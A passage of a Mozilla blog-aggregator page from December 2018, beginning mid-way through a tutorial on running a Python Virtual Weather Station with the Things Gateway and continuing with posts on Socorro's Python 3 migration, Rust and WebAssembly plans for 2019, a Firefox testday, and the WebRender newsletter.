href="http://www.twobraids.com/2018/02/lars-and-real-internet-of-things-part-3.html">Z-Wave setup, </a><br /><a href="http://www.twobraids.com/2018/03/things-gateway-part-6.html">TP-Link setup</a></td></tr><tr><td>A laptop or desktop PC</td><td>the machine to run the Virtual Weather Station. You can use the RPi itself.</td><td>My examples will be for a Linux machine</td></tr><tr><td>a couple things set up on the Things Gateway to control</td><td>this could be bulbs or switches </td><td>I'm using Aeotec Smart Switches to run red and green LED bulbs.</td></tr><tr><td>the <span><b><i>webthing</i></b></span> and <span><i><b>configman</b></i></span> Python3 packages</td><td>these are libraries used by the Virtual Weather Station</td><td>see the pip install directions below</td></tr><tr><td>a clone of the <span><i><b>pywot</b></i></span> github repository</td><td>it is where the the Virtual Weather Station code lives</td><td>see the git clone directions below</td></tr><tr><td>a developer key for online weather data</td><td>this gives you the ability to download data from Weather Underground</td><td><a href="https://www.wunderground.com/weather/api/">it's free from Weather Underground</a></td></tr></tbody></table></div><br /><b><a href="https://draft.blogger.com/null" name="step1">Step 1</a></b>: Download and install the <b><i><span>configman</span></i></b> and <b><i><span>webthing</span></i></b> Python 3 packages.¬† Clone the <b><i><span>pywot</span></i></b> github repository in a local directory appropriate for software development. While this can be done directly on the RPi, I'm choosing to use my Linux workstation.  I like its software development environment better.<br /><pre style="background-color: black; color: lime; font-family: monospace;">        <br />        <span class="pl-v">$</span> sudo pip3 install configman<br />        <span class="pl-v">$</span> sudo pip3 install webthing<br />        <span class="pl-v">$</span> git clone https://github.com/twobraids/pywot.git<br />        <span class="pl-v">$</span> cd pywot<br />        <span class="pl-v">$</span> export PYTHONPATH=$PYTHONPATH:$PWD<br />        <span class="pl-v">$</span> cd demo<br /><br /></pre><br />So what is <b><i><span>configman</span></i></b> ?<br /><br />This is an obscure library for  configuration that I wrote years and years ago.¬† I continue to use it  because it is really handy.¬† It combines command line, config files, the  environment or anything conforming to the abstract type <i><span>collections.Mapping</span></i> to universally manage program configuration.¬† Configuration  requirements can be spread across classes and then used for dynamic  loading and dependency injection.¬† For more information, see my slides  for my PyOhio 2014 talk: <a href="http://uncommonrose.com/presentations/pyohio-2014">Configman</a>.<br /><br />What is <b><i><span>webthing</span></i></b>?<br /><br /><b><span><i>webthing</i></span></b> is a Mozilla package for Python 3, that implements the Web Things api.¬† It provides a set of classes that represent devices and their properties, giving them an implementation that can be controlled over an HTTP connection.<br /><br />What is <b><span><i>pywot</i></span></b>?<br /><br /><b><span><i>pywot</i></span></b> is my project to create a wrapper around <b><i><span>webthing</span></i></b> that offers a more Pythonic interface than <b><i><span>webthing</span></i></b> does alone.¬† <b><i><span>webthing</span></i></b> closely follows a reference implementation written in Javascript, so it offers an API with a distinctly different idiom than most Python modules.¬† <b><span><i>pywot</i></span></b> is an attempt to pave over the idiomatic differences.<br /><br /><b>Step 2</b>:¬† In the <i><span>‚Ä¶/pywot/demo</span></i> directory, there are several example files.¬† <span>virtual_weather_station.py</span><span> is our focus today</span>.¬† In this posting, we're just going to run it, then we'll tear it apart and analyze it in the next posting.<br /><br />Get a <a href="https://www.wunderground.com/weather/api/d/pricing.html">developers account for Weather Underground</a>.¬† Take note of your API key that they assign to you.¬† You'll need this in the next step.<br /><br /><b>Step 3</b>: Using your WU API key, your city and state, run the program like this:<br /><pre style="background-color: black; color: lime; font-family: monospace;">        <br />    <span class="pl-v">$</span> ./virtual_weather_station.py -K YOUR_WU_API_KEY --city_name=Missoula --state_code=MT<br /><br /></pre><br /><div class="separator" style="clear: both; text-align: center;"></div><div class="separator" style="clear: both; text-align: center;"></div><div class="separator" style="clear: both; text-align: center;"><a href="https://3.bp.blogspot.com/-SyN91MiSSoU/Wt5TQViN6AI/AAAAAAAApvs/4VtFmKLxGw4MONEnqaSlRe1sI_Q60IdcwCLcBGAs/s1600/2018-04-18%2B09.12.04.jpg" style="margin-left: 1em; margin-right: 1em;"><img src="2018-04-18@2b09.12.04.jpg" width="240" height="320" border="0" /></a></div><br /><b>Step 4</b>: We're going to assume that there are two light bulbs already configured and named: Red, Green.¬† Add the virtual weather station to the Things Gateway. by pressing the "+" key.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://2.bp.blogspot.com/-dSSswBWDrFc/Wt5KJRHo2TI/AAAAAAAApuc/93k7p9lA01w168ghEPMRrKKpo58ySCvzACLcBGAs/s1600/weather001.png" style="clear: left; float: left; margin-bottom: 1em; margin-right: 1em;"><img src="weather001.png" width="191" height="320" border="0" /></a><a href="https://2.bp.blogspot.com/-gx_kPkhpJGo/Wt5KJbS8_2I/AAAAAAAApug/9GLyn4g3S6IiON2h2LfHuiSqGCk3SeaxQCLcBGAs/s1600/weather003.png" style="margin-left: 1em; margin-right: 1em;"><img src="weather003.png" width="191" height="320" border="0" /></a><a href="https://3.bp.blogspot.com/-4OMokRC8jMc/Wt5KJwJ99AI/AAAAAAAApuo/cX-tJRU_DqIkw4BpI53qPZYEeA1b2av5wCLcBGAs/s1600/weather004.png" style="clear: right; float: right; margin-bottom: 1em; margin-left: 1em;"><img src="weather004.png" width="191" height="320" border="0" /></a></div><span id="goog_45846808"></span><span id="goog_45846809"></span><br />Sometimes, I've noticed that the Things Gateway doesn't immediately find my Virtual Weather Station.¬† I've not nailed it down as to why, but something about mDNS on my network can be very slow to update - sometimes up to ten minutes.¬† In this case, you don't have to wait, just press "Add by URL..." and then enter the IP address of the machine running the Virtual Weather Station with this URL template: "<span>http://IP_ADDRESS:8888</span>"<br /><br /><b>Step 5</b>: The Virtual Weather Station is now fetching weather data every five minutes (as controlled by the configuration value called <span>seconds_between_polling</span>, you can change that on the command line) .¬† The Things Gateway should have that data immediately:¬† press the "splat" on the "THING" icon for the weather station:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-PYAn8Q3ufR0/Wt5KOedoknI/AAAAAAAApvg/fZONy8hBo1wbri8GgmWgHDDz9FLP84cmQCEwYBhgL/s1600/weather013.png" style="margin-left: 1em; margin-right: 1em;"><img src="weather013.png" width="252" height="320" border="0" /></a></div><br /><b>Step 6</b>: Now we can make a rule to turn on the "Green" light whenever the wind speed exceeds the minimum rated speed for our kite.<br /><br />Select RULES from the drop down menu.¬† Drag the Weather Station up into the top half of the screen; select "Wind Speed" from the drop down box; change the "&lt;" to "&gt;"; use the up/down buttons to set the minimum wind speed threshold.¬† I'm choosing 5.<br /><br /><div class="separator" style="clear: both; margin-left: auto; margin-right: auto; text-align: center; width: 80%;"><a href="https://1.bp.blogspot.com/-YNpERhyGi-k/Wt5KLcBjTGI/AAAAAAAApvg/VTPLYFd56MYgP8mcaRjrM43jrgHTCzN9QCEwYBhgL/s1600/weather007.png" style="clear: left; float: left; margin-bottom: 1em; margin-right: 1em;"><img src="weather007.png" width="252" height="320" border="0" /></a><a href="https://4.bp.blogspot.com/-fN6U0JmyWKg/Wt5KMCNrcbI/AAAAAAAApvc/xro73n_Kh5cin75ZncP_dxo6vuxgw21DACEwYBhgL/s1600/weather008.png" style="clear: right; float: right; margin-bottom: 1em; margin-left: 1em;"><img src="weather008.png" width="252" height="320" border="0" /></a></div><br /><div style="clear: both;"><b>Step 7</b>: Drag the "Green" light into the other half of the blank pane, use the drop down box to select the "ON" property.</div><br /><div class="separator" style="clear: both; margin-left: auto; margin-right: auto; text-align: center; width: 80%;"><a href="https://3.bp.blogspot.com/-mRcRdt-nGCQ/Wt5KMdjFyQI/AAAAAAAApvU/8rNqRkAIdtQXxGH0JciUaALBKhr9M3vtwCEwYBhgL/s1600/weather009.png" style="clear: left; float: left; margin-bottom: 1em; margin-right: 1em;"><img src="weather009.png" width="252" height="320" border="0" /></a><a href="https://1.bp.blogspot.com/-ynMhKMJI9ZY/Wt5KNWkVENI/AAAAAAAApvc/rs8jUo3q9r8jyuCyKjVZahAM8s0gN8AfQCEwYBhgL/s1600/weather011.png" style="clear: right; float: right; margin-bottom: 1em; margin-left: 1em;"><img src="weather011.png" width="252" height="320" border="0" /></a></div><br /><div style="clear: both;"><b>Step 8</b>: Go to the top of the page, set a useful name to your rule, press &lt;enter&gt; and then use the left arrow to leave the rule editor.</div><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-XJgpDE0XgKA/Wt5KOOB2XZI/AAAAAAAApvg/b7xeAZ6_hqg9_Gb7W1iHgkVAVEUh0PJegCEwYBhgL/s1600/weather012.png" style="margin-left: 1em; margin-right: 1em;"><img src="weather012.png" width="252" height="320" border="0" /></a></div><b>Step 9</b>:¬† You've now seen how to make a rule based on properties of the Weather Station.¬† Your task is to now make the rule for the Red light.¬† I made mine turn on the red light when the wind is less than 5mph - I call that calm winds.¬† You can make your red light rule do whatever you want.<br /><br />That should be about it.<br /><br />Remember that making a rule implies the creation of a converse rule.¬† The rule that I made above says the Green light should come on when the wind speed is greater than 5mph.¬† The converse rule says that wind speeds below 5mph, the light will go out.<br /><br />If the wind speed was greater than five at the moment that the rule was created, there may be some counterintuitive behavior.¬† It appears that rules aren't applied immediately as they're created.¬† They trigger on an "event" that happens when a property changes value.¬† If the wind was greater than 5mph when the rule was created, the rule didn't yet exist when the "event" happened.¬† The kite light will still work once the wind speed changes again at the next five minute polling point.¬† Be patient.<br /><br /><div class="separator" style="clear: both; margin-left: auto; margin-right: auto; text-align: center; width: 80%;"><a href="https://4.bp.blogspot.com/-clBBusAo-_s/Wtd7vpBsqFI/AAAAAAAApr8/NfThlW1YO_UAVUnec3jHMWpwu3EtKMsLwCPcBGAYYCw/s1600/green.jpg" style="clear: right; float: right; margin-bottom: 1em; margin-left: 1em;"><img src="green.jpg" width="240" height="320" border="0" /></a><a href="https://4.bp.blogspot.com/-0_DZefEcMGQ/Wtd7v71e8WI/AAAAAAAApr8/rBorTwxy1uQHnTMM8XXhHNlRse_nnLcSACPcBGAYYCw/s1600/red.jpg" style="clear: left; float: left; margin-bottom: 1em; margin-right: 1em;"><img src="red.jpg" width="240" height="320" border="0" /></a></div><br /><div style="clear: both;"><b>Bonus Step</b>:¬† want to run the Virtual Weather Station, but don't want to include the WU API key on the command line?¬† Try this:</div><pre style="background-color: black; color: lime; font-family: monospace;">        <br />  <span class="pl-v">$</span> ./virtual_weather_station.py -K YOUR_WU_API_KEY --admin.dump_conf=config.ini<br /><br /></pre>That created a config file called: <i><span>./config.ini</span></i><br />Open up <i><span>./config.ini</span></i> in an editor and uncomment the line that has your WU API key. Save the file.¬† You can specify the  the config file on the command line when you run the Virtual Weather Station.¬† Any of the parameters can be loaded from the ini file.<br /><pre style="background-color: black; color: lime; font-family: monospace;">        <br />  <span class="pl-v">$</span> ./virtual_weather_station.py -admin.conf=config.ini --city_name=Missoula --state_code=MT<br /><br /></pre>Still too much typing?  Instead of the config file, you could just set any/all of the parameters as environment variables: <br /><pre style="background-color: black; color: lime; font-family: monospace;">        <br />  <span class="pl-v">$</span> weather_underground_api_key=YOUR_WU_KEY<br />  <span class="pl-v">$</span> city_name=Missoula<br />  <span class="pl-v">$</span> state_code=MT<br />  <span class="pl-v">$</span> ./virtual_weather_station.py<br /><br /></pre><br />In my next blog post, I'm going to explain the code that runs the Virtual Weather Station in great detail.</div></div><div class="permalink"><a href="http://www.twobraids.com/2018/04/things-gateway-virtual-weather-station.html">by K Lars Lohn at <time datetime="2018-12-14T17:37:09Z" title="December 14, 2018 05:37 PM GMT">‰∏äÂçà1:37:09</time></a></div></div><div class="news andrew-halberstadt" xml:lang="en-us"><a id="news-26"></a><h3><a href="https://ahal.ca/tags/mozilla/" title="Mozilla on Hunting the Shmoo">Andrew Halberstadt</a> ‚Äî <a href="https://ahal.ca/casts/2018/taskgraph-like-a-pro/">Taskgraph Like a Pro</a></h3><div class="entry"><div class="content"><p>Have you ever needed to inspect the taskgraph locally? Did you have a bad time? Learn how to inspect
the taskgraph like a PRO. For the impatient skip to the installation instructions below.</p>

<p>
<br /></p>

<p></p></div></div><div class="permalink"><a title="¬© 2018 Andrew Halberstadt">¬©</a> <a href="https://ahal.ca/casts/2018/taskgraph-like-a-pro/">Andrew Halberstadt at <time datetime="2018-12-14T17:21:21Z" title="December 14, 2018 05:21 PM GMT">‰∏äÂçà1:21:21</time></a></div></div><h2><time datetime="2018-12-14">Friday, 14 December 2018</time></h2><div class="news will-kahn-greene" xml:lang="en"><a id="news-27"></a><h3><a href="https://bluesock.org/~willkg/blog/" title="Will's blog">Will Kahn-Greene</a> ‚Äî <a href="https://bluesock.org/~willkg/blog/mozilla/socorro_python3.html">Socorro: migrating to Python 3</a></h3><div class="entry"><div class="content"><div class="section" id="summary">
<h3>Summary</h3>
<p><a class="reference external" href="https://github.com/mozilla-services/socorro">Socorro</a> is the crash ingestion
pipeline for Mozilla's products like Firefox. When Firefox crashes, the Breakpad
crash reporter asks the user if the user would like to send a crash report. If
the user answers "yes!", then the Breakpad crash reporter collects data related
to the crash, generates a crash report, and submits that crash report as an HTTP
POST to Socorro. Socorro saves the crash report, processes it, and provides an
interface for aggregating, searching, and looking at crash reports.</p>
<p>This blog post talks about the project migrating Socorro to Python 3. It covers
the incremental steps we did and why we chose that path plus some of the
technical problems we hit.</p>
<p><a href="https://bluesock.org/~willkg/blog/mozilla/socorro_python3.html">Read more‚Ä¶</a> (16 mins to read)</p></div></div></div><div class="permalink"><a title="Contents ¬© 2018 Will Kahn-Greene CC BY-SA 3.0">¬©</a> <a href="https://bluesock.org/~willkg/blog/mozilla/socorro_python3.html">Will Kahn-Greene at <time datetime="2018-12-14T15:00:00Z" title="December 14, 2018 03:00 PM GMT">‰∏ãÂçà11:00:00</time></a></div></div><div class="news qmo" xml:lang="en-US"><a id="news-28"></a><h3><a href="https://quality.mozilla.org/" title="Mozilla Quality Assurance">QMO</a> ‚Äî <a href="https://quality.mozilla.org/2018/12/firefox-65-beta-6-testday-december-21th/">Firefox 65 Beta 6 Testday, December 21th</a></h3><div class="entry"><div class="content"><p>Hello Mozillians,</p>
<p>We are happy to let you know that¬†<strong>Friday, December 21th,</strong>¬†we are organizing¬†<strong>Firefox 65 Beta 6 Testday.</strong>¬†We‚Äôll be focusing our testing on: ¬†<span class="b">&lt;notificationbox&gt; and &lt;notification&gt; changes and UpdateDirectory.</span></p>
<p>Check out the detailed instructions via this¬†<a href="https://public.etherpad-mozilla.org/p/testday-20181221">etherpad</a>.</p>
<p>No previous testing experience is required, so feel free to join us on #qa IRC channel where our moderators will offer you guidance and answer your questions.</p>
<p>Join us and help us make Firefox better!</p>
<p>See you on Friday!</p></div></div><div class="permalink"><a href="https://quality.mozilla.org/2018/12/firefox-65-beta-6-testday-december-21th/">by Bogdan Maris at <time datetime="2018-12-14T14:56:18Z" title="December 14, 2018 02:56 PM GMT">‰∏ãÂçà10:56:18</time></a></div></div><div class="news nick-fitzgerald"><a id="news-29"></a><h3><a href="http://fitzgeraldnick.com/" title="Nick Fitzgerald">Nick Fitzgerald</a> ‚Äî <a href="http://fitzgeraldnick.com/2018/12/14/rust-and-webassembly-in-2019.html">Rust and WebAssembly in 2019</a></h3><div class="entry"><div class="content"><p>Compiling Rust to WebAssembly should be the best choice for fast, reliable code
for the Web. Additionally, the same way that Rust integrates with C calling
conventions and libraries on native targets, Rust should also integrate with
JavaScript and HTML5 on the Web. These are the Rust and WebAssembly domain
working group‚Äôs core values.</p>

<p>In 2018, we made it <em>possible</em> to surgically replace performance-sensitive
JavaScript with Rust-generated WebAssembly.</p>

<p><strong>I propose that we make larger-scale adoption of Rust and WebAssembly
<em>practical</em> in 2019.</strong></p>

<blockquote>
  <p><a href="https://rustwasm.github.io/2018/12/06/reflecting-on-rust-and-wasm-in-2018.html#rustwasm2019">#RustWasm2019</a>: To provide some context for this blog post,
the Rust and WebAssembly domain working group is currently soliciting
proposals for its 2019 roadmap. This is my proposal. I encourage you to add
your voice to the discussion as well!</p>
</blockquote>

<h3>A Rising Tide Lifts All Boats</h3>

<p>We should build a toolkit of loosely coupled libraries that make Rust and
WebAssembly development practical. Whether you are carefully inserting a small
wasm module into an existing JavaScript system, architecting a large wasm
module, or starting a green-field Web application, this toolkit should make you
productive.</p>

<p>People use high-level libraries and frameworks instead of using Web APIs
directly because they want abstractions with which they can naturally express
themselves. For example:</p>

<ul>
  <li>I prefer describing how I want the DOM to look like right now, rather than
enumerating a list of modifications that will transform its current state into
my desired state.</li>
  <li>I prefer thinking in terms of Rust types, not about the raw, serialized bytes
in a <code>fetch</code>ed HTTP response body or about object stores in Indexed DB.</li>
</ul>

<p>In order to get to rise to that level of abstraction, we will need a diverse set
of libraries for the various capabilities the Web exposes:</p>

<ul>
  <li>Networking, <code>fetch</code>, and <code>WebSocket</code>s</li>
  <li>Working with forms and <code>&lt;input&gt;</code></li>
  <li>Timers and <code>setTimeout</code></li>
  <li>Web GL and Web Audio</li>
  <li>Persistent client storage with Indexed DB</li>
  <li>A <code>console.log</code>-based backend for <code>env_logger</code> and the Rust logging facade</li>
  <li>URL routing and <code>window.history</code></li>
  <li>Custom elements and Web components</li>
  <li>Etc‚Ä¶</li>
</ul>

<p>In 2018, we made using all of these things <em>possible</em> in that you can access the
underlying JavaScript and Web APIs directly <a href="https://rustwasm.github.io/2018/09/26/announcing-web-sys.html">via <code>wasm-bindgen</code>, <code>js-sys</code> and
<code>web-sy</code></a>, but this is equivalent to programming against the
<code>libc</code> crate directly. In 2019, we should create higher-level abstractions that
wrap the raw, underlying API to yield a better experience that is ultimately
more <em>practical</em>. Green-field Rust and WebAssembly applications would use an
umbrella crate that connects the whole toolkit together and re-exports its
individual crates. Small, targeted wasm modules that are integrating back into
an existing JavaScript application would pick and choose relevant libraries from
the toolkit instead of depending upon the whole umbrella crate.</p>

<p>We should collectively build these higher-level libraries and the toolkit‚Äôs
umbrella crate that connects them together. There is a ton of room here for
contributors to step up and provide leadership for a particular component
library. This toolkit and all of its crates should reflect our working group‚Äôs
core values:</p>

<ul>
  <li>
    <p><strong>Fast:</strong> Let‚Äôs show everyone how fast the Web can be ;-) Zero-cost
abstractions from the ground up. No wandering off the happy path to fall off a
performance cliff. No frames dropped.</p>
  </li>
  <li>
    <p><strong>Reliable:</strong> One of the things that I love about the Rust community is the
high standards we hold ourselves to, in particular for correctness. We should
leverage Rust‚Äôs type system to enforce correctness, write property-based tests
with <a href="https://github.com/BurntSushi/quickcheck"><code>quickcheck</code></a>, and have comprehensive <a href="https://rustwasm.github.io/wasm-bindgen/wasm-bindgen-test/browsers.html">integration tests
running in headless browsers</a>. We intend to build a solid
foundation, and there shouldn‚Äôt be reason to question its structural
integrity.</p>
  </li>
  <li>
    <p><strong>Excellent integration with JavaScript and the Web:</strong> We must empower
incremental Rust and WebAssembly adoption: rewriting from scratch is not
<em>practical</em>. Plus, there is a bunch of JavaScript code that wouldn‚Äôt make
sense to rewrite in Rust because it is just fine right now.</p>
  </li>
</ul>

<p>In addition to supporting our core values, our toolkit should also be:</p>

<ul>
  <li>
    <p><strong>Modular:</strong> Take or leave any individual crate from the toolkit. We do <em>not</em>
want to build a monolithic, walled garden! The goal is to amplify sharing,
compatibility, and improvements; reducing effort duplication across the
blossoming Rust and WebAssembly ecosystem.</p>
  </li>
  <li>
    <p><strong>Ergonomic:</strong> Rust‚Äôs abstractions are not only zero-cost, they are also
expressive! We should leverage this to build APIs that are a joy to work
with. <a href="https://github.com/glium/glium">The <code>glium</code> crate</a> is an excellent example of transmuting a
beautiful Rust crate from a crufty API that was not designed for the Rust
language.</p>
  </li>
</ul>

<p>Some of the aforementioned Web APIs are already wrapped up into high-level APIs
in crates that already exist. However, few of the extant crates fulfill all of
our requirements. Most commonly they are lacking modularity: we‚Äôve seen more
‚Äúframeworks‚Äù than single-purpose libraries collected into ‚Äútoolkits‚Äù.
Nonetheless, we should collaborate to improve existing crates and tease them
apart into small, single-purpose libraries where it makes sense and everyone is
on board.</p>

<p>Finally, the inspiration for this idea of developing a loosely coupled toolkit
comes from the Rust Networking domain working group‚Äôs <a href="https://rust-lang-nursery.github.io/wg-net/2018/09/11/tide.html">Tide</a> project, and
also from the <a href="https://github.com/choojs/choo">Choo</a> JavaScript project. Thanks!</p>

<h3>Tooling</h3>

<p>Right now, <a href="https://github.com/rustwasm/wasm-pack"><code>wasm-pack</code></a> will orchestrate your building and testing
workflows, and generate a <code>package.json</code> file to help you integrate with
JavaScript tooling. It will publish your Rust-generated WebAssembly package to
NPM, making distribution easy.</p>

<p>But there are a few things that we intended to include in 2018 that didn‚Äôt quite
make the cut:</p>

<ul>
  <li>Integrating and automating execution of <a href="https://github.com/WebAssembly/binaryen">the <code>binaryen</code> project‚Äôs <code>wasm-opt</code>
tool</a>.</li>
  <li>Support for generating a single NPM package that will work both on the Web and
in Node.js.</li>
  <li>Allowing a library crate <code>X</code> to declare that it has a runtime dependency on an
external NPM package, and have that reflected in the <code>package.json</code> that
<code>wasm-pack</code> produces for some crate <code>Y</code> that transitively depends on <code>X</code>.</li>
  <li>Including local assets (notably JavaScript snippets) into <code>wasm-pack</code>‚Äôs
generated NPM package. Again, with support for crates that are transitively
depended upon.</li>
</ul>

<p>I suspect the latter two items in particular will be necessary for building out
the toolkit.</p>

<p>We should finish these tasks and polish <code>wasm-pack</code> into a 1.0 tool. Following
that, we should let experience and necessity guide our efforts.</p>

<p>One final note on tooling: Internet Explorer 11 is the last browser that still
has non-trivial market share and doesn‚Äôt support wasm. It is mostly <em>possible</em>
to support IE11 by using <a href="https://github.com/WebAssembly/binaryen">the <code>binaryen</code> project‚Äôs <code>wasm2js</code> tool</a> to
compile our wasm into JavaScript. But <code>wasm2js</code> is still missing some core
functionality, and the whole experience of writing a Rust and wasm app while
also supporting IE11 is far from turnkey. Because this is so important for
actually shipping a Rust and wasm project, we shouldn‚Äôt leave this problem for
users to solve via integration with external tooling: we should build support
for it into our toolchain. This way we can provide that turnkey experience, and
make sure that <em>all</em> wasm code that our toolchain emits is fully supported on
Internet Explorer 11.</p>

<h3>Multithreading</h3>

<p>We must bring Rust‚Äôs <a href="https://blog.rust-lang.org/2015/04/10/Fearless-Concurrency.html">fearless concurrency</a> to the Web!</p>

<p>Of the languages (C, C++, and Rust) that can use shared memory threading on the
Web, only Rust can safely do so. The Web APIs necessary for multithreading are
stabilizing and will be enabled by default in browsers soon. We should be ready.</p>

<p>However, we can‚Äôt just make <code>std::thread</code> work transparently in wasm, due to the
nature of the APIs the Web platform is exposing. For example, we can‚Äôt block the
event loop indefinitely, even in a worker thread, and we need to change the
global allocator to avoid waiting on locks on the main thread. See Alex‚Äôs
excellent <a href="https://rustwasm.github.io/2018/10/24/multithreading-rust-and-wasm.html">Multithreading Rust and WebAssembly</a> write up for details.</p>

<p>Therefore, I think this multithreading effort will mostly involve creating a
thread pool library for the whole wasm ecosystem to share, and then building
channels and other concurrency abstractions on top of it. We should also get
support for wasm threading and our thread pool library upstream into crates like
<a href="https://github.com/rayon-rs/rayon"><code>rayon</code></a> as well. This isn‚Äôt actually that different from the library
and toolkit work, but it is worth singling out due to its scale, the unique
nature of the problem domain, and what a huge game changer multithreading on the
Web will be.</p>

<h3>#RustWasm2019</h3>

<p>I think 2019 holds a <em>very</em> bright future for Rust and WebAssembly.</p></div></div><div class="permalink"><a href="http://fitzgeraldnick.com/2018/12/14/rust-and-webassembly-in-2019.html">by Nick Fitzgerald at <time datetime="2018-12-14T08:00:00Z" title="December 14, 2018 08:00 AM GMT">‰∏ãÂçà4:00:00</time></a></div></div><h2><time datetime="2018-12-13">Thursday, 13 December 2018</time></h2><div class="news mozilla-gfx" xml:lang="en"><a id="news-30"></a><h3><a href="https://mozillagfx.wordpress.com/" title="Mozilla Gfx Team Blog">Mozilla GFX</a> ‚Äî <a href="https://mozillagfx.wordpress.com/2018/12/13/webrender-newsletter-33/">WebRender newsletter #33</a></h3><div class="entry"><div class="content"><p>Hi! The newsletter skipped a week because of Mozilla‚Äôs bi-annual allhands which took place in Orlando last week. We‚Äôll probably skip a few others in December as a lot of the gfx folks are taking some time off. Before I get to the usual change list, I‚Äôll continue answering the questions nic4r <a href="https://mozillagfx.wordpress.com/2018/11/21/webrender-newsletter-31/#comment-2756">asked</a> in the 31st newsletter‚Äôs comment section:</p>
<blockquote><p>
  Is the interning work Glenn is doing related to picture caching?
</p></blockquote>
<p>Yes indeed. In order for picture caching to work across displaylists we must be able to detect what did not change after a new displaylist arrives. The interning mechanism introduced by Glenn in <a href="https://github.com/servo/webrender/pull/3075">#3075</a> gives us this ability in addition to other goodies such as de-duplication of interned resources and less CPU-GPU data transfer.</p>
<blockquote><p>
  What is blob tiling and what does it offer above normal blob rendering?
</p></blockquote>
<p>Tiling blobs means splitting blobs into square tiles. For very large blobs this means we can lazily rasterize tiles as they come into the viewport without throwing away the rest instead of either rasterizing excessively large blob images in one go or having to clip the blob against the viewport and re-rasterize everything during scrolling as the bounds of the blob change. It also lets us rasterize tiles in parallel.</p>
<blockquote><p>
  Is there a bug to watch some of the document splitting work going on? My understanding is that document splitting will make the chrome more resilient against slow scene builds in the content frame? Is this right? How does this compare to push_iframe in the DL.
</p></blockquote>
<p>You can look at <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1441308">bug 1441308</a> although it doesn‚Äôt contain a lot of updates. In a nutshell, the bulk of the Gecko side work is done and there are WebRender side adjustments and some debugging to do. Currently WebRender can nest displaylists from different sources (content, UI, etc) by nesting iframes into a single document. Any change to the document more or less causes it to be re-rendered entirely (modulo caching optimizations).</p>
<p>Separating the UI and web content into separate documents mostly means we will update them independently and updating one won‚Äôt cause the other to be re-built and re-rendered. It will also let us render the the two in separate OS compositor windows.</p>
<p>One of the most complicated aspect of this is probably due to the way the browser is structured to nest the web content within the UI (there is both a background behind the web content and elements on top of it that belong to the UI). A lot of the work that went into this was to be able to split without introducing a lot of overdraw (needlessly allocating texture space for the background behind the web content and drawing it).</p>
<blockquote><p>
  OMTA for color, gradients, etc? How much more of CSS can be feasibly calculated off thread and fed to WR using its Property Binding infra?
</p></blockquote>
<p>Anything is possible given enough time and motivation but with WebRender‚Äôs current architecture, any of the data that is fed directly to the shaders is a good candidate for animated property bindings. Colors are particularly appealing because it is the most commonly animated CSS property that we don‚Äôt already run as an off-main-thread animation (I don‚Äôt have the data handy though). We‚Äôll likely tackle these nice perf optimizations after WebRender is shipped and stable.</p>
<h3>Notable WebRender and Gecko changes</h3>
<ul>
<li>Bobby overhauled WebRender shader cache.</li>
<li>Bobby switched non-WebRender‚Äôs AWSY test to VMs with GPUs.</li>
<li>Kats made some Android improvements.</li>
<li>Kats made some progress on the Windows CI work.</li>
<li>Kvark <a href="https://github.com/servo/webrender/pull/3366">removed</a> some memcpys leading to a 5% improvement on dl_mutate.</li>
<li>Kvark <a href="https://github.com/servo/webrender/pull/3366">improved</a> the render target allocation scheme, improving GPU times and VRAM consumption on a lot of sites.</li>
<li>Matt added new telemetry.</li>
<li>Andrew fixed a few regressions from animated image recycling.</li>
<li>Andrew Kvark and Nical chased <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1492241">a crash</a> caused by two race conditions and landed two fixes.</li>
<li>Emilio <a href="https://github.com/servo/webrender/pull/3401">fixed</a> transform flattening.</li>
<li>Emilio <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1513009">enabled</a> warning-as-errors for rust code in CI.</li>
<li>Glenn <a href="https://github.com/servo/webrender/pull/3370">fixed</a> the way we track frame ids.</li>
<li>Glenn <a href="https://github.com/servo/webrender/pull/3376">fixed</a> eager texture cache eviction.</li>
<li>Glenn <a href="https://github.com/servo/webrender/pull/3379">added</a> support for picture caching.</li>
<li>Glenn <a href="https://github.com/servo/webrender/pull/3381">started</a> a series of changes removing clips expressed in local space which cause over-invalidation of interned primitives and prevent picture caching to work effectively across displaylist changes. See also <a href="https://github.com/servo/webrender/pull/3383">(1)</a>, <a href="https://github.com/servo/webrender/pull/3383">(2)</a>, <a href="https://github.com/servo/webrender/pull/3384">(3)</a>, <a href="https://github.com/servo/webrender/pull/3386">(4)</a>, <a href="https://github.com/servo/webrender/pull/3395">(5)</a>.</li>
<li>Glenn <a href="https://github.com/servo/webrender/pull/3391">added</a> memory profile counters for interning.</li>
<li>Glenn <a href="https://github.com/servo/webrender/pull/3396">moved</a> the picture caching tiles to the opaque pass.</li>
<li>Sotaro <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1512919">removed</a> some dead code.</li>
<li>Sotaro <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1415020">fixed</a> a shutdown crash on Linux.</li>
<li>Timothy <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1415987">hooked up</a> proper scale selection.</li>
</ul>
<h3>Ongoing work</h3>
<ul>
<li>Bobby is adding lazy initialization to D3D11 and D2D outside the GPU process to save memory.</li>
<li>Jeff and Nical are working on blob recoordination.</li>
<li>Matt is working on avoiding to render on changes within zero-opacity elements.</li>
<li>Matt is making WebRender‚Äôs behavior more similar to non-WebRender‚Äôs during catch-up compositing to make comparison easier. </li>
<li>Lee continues tracking down font related <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1455848">crashes</a> and <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1492443">rendering issues</a> with very large text</li>
<li>Emilio is dreaming of 3d transforms (I believe he actually used the term ‚Äúnightmare‚Äù).</li>
<li>Sotaro is investigating SVG rendering bugs.</li>
</ul>
<h3>Enabling WebRender in Firefox Nightly</h3>
<p>In <em>about:config</em>, set the pref ‚Äúgfx.webrender.all‚Äù to true and restart the browser.</p>
<h3>Reporting bugs</h3>
<p>The best place to report bugs related to WebRender in Firefox is the <a href="https://bugzilla.mozilla.org/enter_bug.cgi?product=Core&amp;component=Graphics%3A%20WebRender">Graphics :: WebRender component in bugzilla</a>.<br />
